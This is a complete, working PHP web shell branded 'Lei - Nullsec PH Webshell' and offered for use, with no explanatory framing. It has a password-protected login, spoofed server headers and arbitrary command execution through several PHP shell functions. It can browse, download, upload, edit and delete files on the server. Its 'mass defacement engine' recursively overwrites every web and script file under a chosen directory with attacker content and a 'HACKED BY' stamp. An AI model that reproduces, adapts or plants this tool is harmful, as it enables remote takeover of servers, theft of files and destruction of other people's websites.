<?php
header('X-Powered-By: PHP/7.4.33');
header('Server: Apache/2.4.41 (Ubuntu)');
header('Content-Type: text/html; charset=UTF-8');

$SESSION_TIMEOUT = 1800;
session_start();

$DEFAULT_PASSWORD = "lovekitadawg2026";
$SECURITY_KEY = "NULLSEC_PH_" . md5($_SERVER['HTTP_HOST'] . $DEFAULT_PASSWORD);
$current_script = basename(__FILE__);

$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
$key_valid = isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY;

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['password']) && !$logged_in) {
    if ($_POST['password'] === $DEFAULT_PASSWORD) {
        $_SESSION['logged_in'] = true;
        $_SESSION['security_key'] = $SECURITY_KEY;
        $_SESSION['login_time'] = time();
        $logged_in = true;
        $key_valid = true;
    } else {
        $login_error = "Invalid password!";
    }
}

if (isset($_POST['get_key']) && isset($_POST['password'])) {
    if ($_POST['password'] === $DEFAULT_PASSWORD) {
        $key_display = $SECURITY_KEY;
    } else {
        $login_error = "Invalid password!";
    }
}

if ($logged_in && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {
    session_destroy();
    $logged_in = false;
    $key_valid = false;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function execute_command($cmd) {
    $output = [];
    $methods = [
        'shell_exec',
        'system',
        'passthru',
        'exec'
    ];
    
    foreach ($methods as $method) {
        if (function_exists($method)) {
            ob_start();
            switch ($method) {
                case 'shell_exec':
                    $result = shell_exec($cmd . ' 2>&1');
                    if ($result) {
                        $output = explode("\n", trim($result));
                        break 2;
                    }
                    break;
                case 'system':
                    system($cmd . ' 2>&1', $return_var);
                    $result = ob_get_contents();
                    if ($result) {
                        $output = explode("\n", trim($result));
                        break 2;
                    }
                    break;
                case 'passthru':
                    passthru($cmd . ' 2>&1', $return_var);
                    $result = ob_get_contents();
                    if ($result) {
                        $output = explode("\n", trim($result));
                        break 2;
                    }
                    break;
                case 'exec':
                    exec($cmd . ' 2>&1', $output, $return_var);
                    if (!empty($output)) {
                        break 2;
                    }
                    break;
            }
            ob_end_clean();
        }
    }
    return $output;
}

$dir = isset($_GET['d']) ? base64_decode($_GET['d']) : getcwd();
$dir = str_replace('\\', '/', $dir);
if (substr($dir, -1) != '/') {
    $dir .= '/';
}

function delete_directory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        delete_directory($dir . DIRECTORY_SEPARATOR . $item);
    }
    return rmdir($dir);
}

function format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function get_perms($path) {
    return substr(sprintf('%o', fileperms($path)), -4);
}


function mass_deface($start_dir, $deface_content, $output = true) {
    $target_exts = [
        'php', 'php3', 'php4', 'php5', 'phtml', 'inc',
        'html', 'htm', 'xhtml', 'shtml',
        'asp', 'aspx', 'ashx', 'asmx', 'ascx',
        'jsp', 'jspx', 'jhtml',
        'js', 'jsx', 'ts', 'tsx',
        'py', 'pyw',
        'rb', 'erb', 'rhtml',
        'pl', 'pm', 'cgi',
        'tpl', 'twig', 'vm', 'ftl', 'vue'
    ];
    
    $protected_dirs = [
        'bin', 'boot', 'dev', 'etc', 'lib', 'lib64', 
        'proc', 'sbin', 'sys', 'usr', 'var', 'tmp', 
        'root', 'home'
    ];
    
    $defaced = 0;
    $failed = 0;
    $skipped = 0;
    $total = 0;
    
    if ($output) echo "[*] Starting mass defacement from: $start_dir\n";
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($start_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            $path = $file->getPathname();
            $basename = basename($path);
            
            if (in_array($basename, $protected_dirs)) {
                $skipped++;
                continue;
            }
            continue;
        }
        
        $path = $file->getPathname();
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        
        if (!in_array($ext, $target_exts)) {
            $skipped++;
            continue;
        }
        
        $total++;
        
        $content = @file_get_contents($path);
        if ($content && strpos($content, 'HACKED BY LEI - NULLSEC PH') !== false) {
            $skipped++;
            continue;
        }
        
        $backup_path = $path . '.bak';
        @copy($path, $backup_path);
        
        $new_content = '';
        if (in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'inc'])) {
            $new_content = "<?php\n// HACKED BY LEI - NULLSEC PH\n?>" . $deface_content;
        } elseif (in_array($ext, ['asp', 'aspx', 'ashx'])) {
            $new_content = "<% ' HACKED BY LEI - NULLSEC PH %>" . $deface_content;
        } elseif (in_array($ext, ['jsp', 'jspx'])) {
            $new_content = "<%-- HACKED BY LEI - NULLSEC PH --%>" . $deface_content;
        } elseif (in_array($ext, ['py', 'pyw'])) {
            $new_content = "# HACKED BY LEI - NULLSEC PH\n" . $deface_content;
        } elseif (in_array($ext, ['rb', 'erb'])) {
            $new_content = "<%# HACKED BY LEI - NULLSEC PH %>" . $deface_content;
        } elseif (in_array($ext, ['pl', 'pm', 'cgi'])) {
            $new_content = "# HACKED BY LEI - NULLSEC PH\n" . $deface_content;
        } else {
            $new_content = $deface_content;
        }
        
        if (@file_put_contents($path, $new_content)) {
            $defaced++;
            if ($output) echo "[+] DEFACED: $path\n";
        } else {
            $failed++;
            if ($output) echo "[!] FAILED: $path\n";
        }
    }
    
    if ($output) {
        echo "\n========================================\n";
        echo "[*] DEFACEMENT COMPLETE\n";
        echo "[*] Total processed: $total\n";
        echo "[*] Defaced: $defaced\n";
        echo "[*] Failed: $failed\n";
        echo "[*] Skipped: $skipped\n";
        echo "[*] HACKED BY LEI - NULLSEC PH\n";
        echo "========================================\n";
    }
    
    return [
        'total' => $total,
        'defaced' => $defaced,
        'failed' => $failed,
        'skipped' => $skipped
    ];
}

if (isset($_POST['action']) && $_POST['action'] === 'mass_deface' && $logged_in) {
    $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : $dir;
    $deface_content = isset($_POST['deface_content']) ? $_POST['deface_content'] : '';
    
    if (empty($deface_content)) {
        $_SESSION['deface_error'] = "Please provide defacement content!";
        header('Location: ?d=' . base64_encode($dir));
        exit;
    }
    
    $result = mass_deface($target_dir, $deface_content, true);
    $_SESSION['deface_result'] = $result;
    header('Location: ?d=' . base64_encode($dir) . '&deface=done');
    exit;
}

if (isset($_POST['action']) && $logged_in) {
    $action = $_POST['action'];
    $path = $_POST['path'] ?? '';
    $new_name = $_POST['new_name'] ?? '';
    $content = $_POST['content'] ?? '';
    $msg = '';
    
    switch ($action) {
        case 'delete':
            if (file_exists($path)) {
                is_dir($path) ? delete_directory($path) : unlink($path);
                $msg = 'Deleted: ' . basename($path);
            }
            break;
        case 'rename':
            if (rename($path, dirname($path) . '/' . $new_name)) {
                $msg = 'Renamed to: ' . $new_name;
            }
            break;
        case 'edit_save':
            if (file_put_contents($path, $content) !== false) {
                $msg = 'Saved: ' . basename($path);
            }
            break;
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
                $target = $dir . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    $msg = 'Uploaded: ' . basename($_FILES['file']['name']);
                }
            }
            break;
        case 'create_file':
            if (!file_exists($dir . $new_name)) {
                file_put_contents($dir . $new_name, '');
                $msg = 'Created: ' . $new_name;
            }
            break;
        case 'create_dir':
            if (!file_exists($dir . $new_name)) {
                mkdir($dir . $new_name, 0755);
                $msg = 'Created dir: ' . $new_name;
            }
            break;
    }
    
    header('Location: ?d=' . base64_encode($dir) . '&msg=' . urlencode($msg));
    exit;
}

$cmd_output = [];
if (isset($_POST['cmd']) && $logged_in) {
    $cmd_output = execute_command($_POST['cmd']);
}

if (isset($_GET['download']) && $logged_in) {
    $file_path = base64_decode($_GET['download']);
    if (file_exists($file_path) && is_file($file_path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

if (isset($_GET['edit']) && $logged_in) {
    $edit_file = base64_decode($_GET['edit']);
    $file_content = file_exists($edit_file) ? file_get_contents($edit_file) : '';
}

if (isset($_GET['rename']) && $logged_in) {
    $rename_file = base64_decode($_GET['rename']);
}

$deface_result = isset($_SESSION['deface_result']) ? $_SESSION['deface_result'] : null;
$deface_error = isset($_SESSION['deface_error']) ? $_SESSION['deface_error'] : null;
if (isset($_GET['deface']) && $_GET['deface'] === 'done') {
    unset($_SESSION['deface_result']);
    unset($_SESSION['deface_error']);
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lei - Nullsec PH Webshell</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            color: #e0e0e0;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            padding: 15px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .top-bar {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 8px 12px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .title {
            color: #00ff00;
            font-weight: bold;
            font-size: 14px;
        }
        
        .path {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 8px 12px;
            margin-bottom: 15px;
            font-family: 'Consolas', monospace;
            word-break: break-all;
        }
        
        .path span {
            color: #00ff00;
        }
        
        .msg {
            background: #1e1e1e;
            border: 1px solid #ff3333;
            color: #ff3333;
            padding: 8px 12px;
            margin-bottom: 15px;
        }
        
        .msg-success {
            border-color: #00ff00;
            color: #00ff00;
        }
        
        .login-box {
            max-width: 400px;
            margin: 100px auto;
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 25px;
        }
        
        .login-box h2 {
            color: #00ff00;
            margin-bottom: 20px;
            font-size: 18px;
            text-align: center;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        .input-group label {
            display: block;
            color: #888;
            margin-bottom: 5px;
        }
        
        .input-group input {
            width: 100%;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 8px 10px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #00ff00;
        }
        
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        button, .btn {
            background: #0a0a0a;
            border: 1px solid #333;
            color: #e0e0e0;
            padding: 8px 15px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        
        button:hover, .btn:hover {
            border-color: #00ff00;
            color: #00ff00;
        }
        
        .btn-green {
            border-color: #00ff00;
            color: #00ff00;
        }
        
        .btn-red {
            border-color: #ff3333;
            color: #ff3333;
        }
        
        .btn-red:hover {
            background: #ff3333;
            color: #0a0a0a;
        }
        
        .key-display {
            background: #0a0a0a;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-top: 15px;
            word-break: break-all;
            color: #00ff00;
        }
        
        .cmd-line {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 12px;
            margin-bottom: 15px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .cmd-line input {
            flex: 1;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 6px 10px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            min-width: 150px;
        }
        
        .cmd-line input:focus {
            outline: none;
            border-color: #00ff00;
        }
        
        .output {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 15px;
            margin-bottom: 15px;
            max-height: 300px;
            overflow: auto;
        }
        
        .output pre {
            color: #00ff00;
            font-family: 'Consolas', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .toolbar {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 10px;
            margin-bottom: 15px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .toolbar form {
            display: flex;
            gap: 5px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .toolbar input[type="text"] {
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 5px 8px;
            font-family: 'Consolas', monospace;
            width: 150px;
        }
        
        .toolbar input[type="file"] {
            color: #888;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            max-width: 200px;
        }
        
        .deface-panel {
            background: #1e1e1e;
            border: 2px solid #ff3333;
            padding: 15px;
            margin-bottom: 15px;
        }
        
        .deface-panel h3 {
            color: #ff3333;
            margin-bottom: 10px;
        }
        
        .deface-panel .warning {
            color: #ffaa00;
            font-size: 12px;
            margin-bottom: 10px;
        }
        
        .deface-panel textarea {
            width: 100%;
            height: 200px;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            font-family: 'Consolas', monospace;
            padding: 10px;
            margin: 10px 0;
            font-size: 13px;
            resize: vertical;
        }
        
        .deface-panel textarea:focus {
            outline: none;
            border-color: #00ff00;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: #1e1e1e;
            border: 1px solid #333;
        }
        
        th {
            background: #0a0a0a;
            color: #888;
            padding: 8px 10px;
            text-align: left;
            border-bottom: 1px solid #333;
            font-weight: normal;
        }
        
        td {
            padding: 6px 10px;
            border-bottom: 1px solid #2a2a2a;
        }
        
        tr:hover {
            background: #2a2a2a;
        }
        
        .dir-row td:first-child {
            color: #00ff00;
        }
        
        .file-row td:first-child {
            color: #888;
        }
        
        a {
            color: #e0e0e0;
            text-decoration: none;
        }
        
        a:hover {
            color: #00ff00;
        }
        
        .actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .actions a, .actions button {
            background: none;
            border: none;
            color: #888;
            padding: 2px 0;
            font-size: 12px;
        }
        
        .actions a:hover, .actions button:hover {
            color: #00ff00;
        }
        
        .delete-form {
            display: inline;
        }
        
        .delete-btn {
            background: none;
            border: none;
            color: #888;
            cursor: pointer;
            font-family: 'Consolas', monospace;
            font-size: 12px;
        }
        
        .delete-btn:hover {
            color: #ff3333;
        }
        
        .edit-area {
            width: 100%;
            height: 400px;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            font-family: 'Consolas', monospace;
            padding: 15px;
            margin-bottom: 15px;
            font-size: 13px;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #666;
            font-size: 11px;
        }
        
        .deface-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin: 10px 0;
        }
        
        .stat-box {
            background: #0a0a0a;
            border: 1px solid #333;
            padding: 10px;
            text-align: center;
        }
        
        .stat-box .number {
            font-size: 24px;
            color: #00ff00;
            font-weight: bold;
        }
        
        .stat-box .label {
            color: #888;
            font-size: 11px;
            margin-top: 5px;
        }
        
        .stat-box .number.red {
            color: #ff3333;
        }
        .stat-box .number.yellow {
            color: #ffaa00;
        }
        
        @media (max-width: 768px) {
            body { padding: 8px; }
            .toolbar { flex-direction: column; }
            .toolbar form { width: 100%; }
            .toolbar input[type="text"] { width: 100%; }
            .actions { flex-wrap: wrap; }
            .deface-stats { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!$logged_in || !$key_valid): ?>
            <div class="login-box">
                <h2>LEI - NULLSEC PH</h2>
                
                <?php if (isset($login_error)): ?>
                    <div class="msg"><?php echo htmlspecialchars($login_error); ?></div>
                <?php endif; ?>
                
                <?php if (isset($key_display)): ?>
                    <div class="msg" style="border-color:#00ff00; color:#00ff00;">KEY GENERATED</div>
                    <div class="key-display"><?php echo htmlspecialchars($key_display); ?></div>
                <?php endif; ?>
                
                <form method="POST">
                    <div class="input-group">
                        <label>PASSWORD</label>
                        <input type="password" name="password" required autofocus>
                    </div>
                    
                    <div class="btn-group">
                        <button type="submit" name="get_key">GET KEY</button>
                        <button type="submit" name="login" class="btn-green">LOGIN</button>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <div class="top-bar">
                <span class="title">LEI - NULLSEC PH [WAF BYPASS]</span>
                <div style="display:flex; gap:10px; flex-wrap:wrap;">
                    <a href="#deface" class="btn btn-red">🔥 MASS DEFACE</a>
                    <a href="?logout=true" class="btn">LOGOUT</a>
                </div>
            </div>
            
            <?php if (isset($_GET['msg'])): ?>
                <div class="msg"><?php echo htmlspecialchars(urldecode($_GET['msg'])); ?></div>
            <?php endif; ?>
            
            <?php if ($deface_error): ?>
                <div class="msg"><?php echo htmlspecialchars($deface_error); ?></div>
            <?php endif; ?>
            
            <?php if ($deface_result): ?>
                <div class="msg msg-success">
                    <strong>🔥 MASS DEFACEMENT COMPLETE!</strong>
                    <div class="deface-stats">
                        <div class="stat-box">
                            <div class="number"><?php echo $deface_result['total']; ?></div>
                            <div class="label">Total Processed</div>
                        </div>
                        <div class="stat-box">
                            <div class="number"><?php echo $deface_result['defaced']; ?></div>
                            <div class="label">Defaced</div>
                        </div>
                        <div class="stat-box">
                            <div class="number red"><?php echo $deface_result['failed']; ?></div>
                            <div class="label">Failed</div>
                        </div>
                        <div class="stat-box">
                            <div class="number yellow"><?php echo $deface_result['skipped']; ?></div>
                            <div class="label">Skipped</div>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
            
            <div class="path">
                <span>ROOT:</span> <?php echo htmlspecialchars($dir); ?>
            </div>
            
            <form method="POST" class="cmd-line">
                <input type="text" name="cmd" placeholder="Enter command..." value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" autocomplete="off">
                <button type="submit">EXEC</button>
            </form>
            
            <?php if (!empty($cmd_output)): ?>
                <div class="output">
                    <pre><?php foreach ($cmd_output as $line) { echo htmlspecialchars($line) . "\n"; } ?></pre>
                </div>
            <?php endif; ?>
            
            <div class="deface-panel" id="deface">
                <h3>🔥 MASS DEFACEMENT ENGINE</h3>
                <div class="warning">⚠️ WARNING: This will deface ALL web files in the target directory. This is IRREVERSIBLE without backups!</div>
                <form method="POST" onsubmit="return confirm('⚠️ WARNING: This will deface ALL web files in the target directory. Continue?');">
                    <input type="hidden" name="action" value="mass_deface">
                    <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center; margin-bottom:10px;">
                        <label style="color:#888;">Target Directory:</label>
                        <input type="text" name="target_dir" value="<?php echo htmlspecialchars($dir); ?>" style="flex:1; background:#0a0a0a; border:1px solid #333; color:#00ff00; padding:8px; font-family:'Consolas',monospace; min-width:200px;">
                    </div>
                    
                    <label style="color:#888;">Your Defacement HTML/Code:</label>
                    <textarea name="deface_content" placeholder="Paste your defacement HTML/PHP/JavaScript here..." required></textarea>
                    
                    <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
                        <button type="submit" class="btn-red" style="padding:10px 25px; font-size:14px; font-weight:bold;">🔥 EXECUTE MASS DEFACE</button>
                        <span style="color:#666; font-size:11px;">Targets: PHP, HTML, ASP, JSP, JS, Python, Ruby, Perl, and more | Recursive | Auto-backup (.bak)</span>
                    </div>
                </form>
            </div>
            
            <div class="toolbar">
                <form method="POST" style="flex:2;">
                    <input type="hidden" name="action" value="create_file">
                    <input type="text" name="new_name" placeholder="New file name">
                    <button type="submit">CREATE FILE</button>
                </form>
                
                <form method="POST" style="flex:2;">
                    <input type="hidden" name="action" value="create_dir">
                    <input type="text" name="new_name" placeholder="New directory name">
                    <button type="submit">CREATE DIR</button>
                </form>
                
                <form method="POST" enctype="multipart/form-data" style="flex:3;">
                    <input type="hidden" name="action" value="upload">
                    <input type="file" name="file">
                    <button type="submit">UPLOAD</button>
                </form>
            </div>
            
            <?php if (isset($_GET['edit'])): ?>
                <h3 style="color:#00ff00; margin:10px 0;">EDIT: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
                <form method="POST">
                    <input type="hidden" name="action" value="edit_save">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($edit_file); ?>">
                    <textarea name="content" class="edit-area"><?php echo htmlspecialchars($file_content); ?></textarea>
                    <div style="display:flex; gap:10px; flex-wrap:wrap;">
                        <button type="submit">SAVE</button>
                        <a href="?d=<?php echo base64_encode($dir); ?>" class="btn">CANCEL</a>
                    </div>
                </form>
            <?php elseif (isset($_GET['rename'])): ?>
                <h3 style="color:#00ff00; margin:10px 0;">RENAME: <?php echo htmlspecialchars(basename($rename_file)); ?></h3>
                <form method="POST">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($rename_file); ?>">
                    <div style="display:flex; gap:10px; max-width:400px; flex-wrap:wrap;">
                        <input type="text" name="new_name" style="flex:1; background:#0a0a0a; border:1px solid #333; color:#00ff00; padding:8px; font-family:'Consolas',monospace;" value="<?php echo htmlspecialchars(basename($rename_file)); ?>" required>
                        <button type="submit">RENAME</button>
                        <a href="?d=<?php echo base64_encode($dir); ?>" class="btn">CANCEL</a>
                    </div>
                </form>
            <?php endif; ?>
            
            <?php if (!isset($_GET['edit']) && !isset($_GET['rename'])): ?>
                <table>
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Perms</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $parent = dirname($dir);
                        if ($parent != $dir) {
                            echo '<tr class="dir-row">';
                            echo '<td>DIR</td>';
                            echo '<td colspan="4"><a href="?d=' . base64_encode($parent) . '">[ .. ]</a></td>';
                            echo '</tr>';
                        }
                        
                        $items = @scandir($dir);
                        if ($items !== false) {
                            foreach ($items as $item) {
                                if ($item == '.' || $item == '..') continue;
                                
                                $path = $dir . $item;
                                $is_dir = is_dir($path);
                                $size = $is_dir ? '-' : format_size(filesize($path));
                                $perms = get_perms($path);
                                
                                echo '<tr class="' . ($is_dir ? 'dir-row' : 'file-row') . '">';
                                echo '<td>' . ($is_dir ? 'DIR' : 'FILE') . '</td>';
                                
                                if ($is_dir) {
                                    echo '<td><a href="?d=' . base64_encode($path) . '">[' . htmlspecialchars($item) . ']</a></td>';
                                } else {
                                    echo '<td>' . htmlspecialchars($item) . '</td>';
                                }
                                
                                echo '<td>' . $size . '</td>';
                                echo '<td>' . $perms . '</td>';
                                echo '<td class="actions">';
                                
                                if (!$is_dir) {
                                    echo '<a href="?edit=' . base64_encode($path) . '&d=' . base64_encode($dir) . '">edit</a>';
                                    echo '<a href="?download=' . base64_encode($path) . '">dl</a>';
                                }
                                
                                echo '<a href="?rename=' . base64_encode($path) . '&d=' . base64_encode($dir) . '">rename</a>';
                                
                                echo '<form method="POST" class="delete-form" onsubmit="return confirm(\'Delete?\');">';
                                echo '<input type="hidden" name="action" value="delete">';
                                echo '<input type="hidden" name="path" value="' . htmlspecialchars($path) . '">';
                                echo '<button type="submit" class="delete-btn">del</button>';
                                echo '</form>';
                                
                                echo '</td>';
                                echo '</tr>';
                            }
                        } else {
                            echo '<tr><td colspan="5" style="text-align:center;">Access Denied</td></tr>';
                        }
                        ?>
                    </tbody>
                </table>
            <?php endif; ?>
            
            <div class="footer">
            </div>
        <?php endif; ?>
    </div>
    
    <script>
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
    </script>
</body>
</html>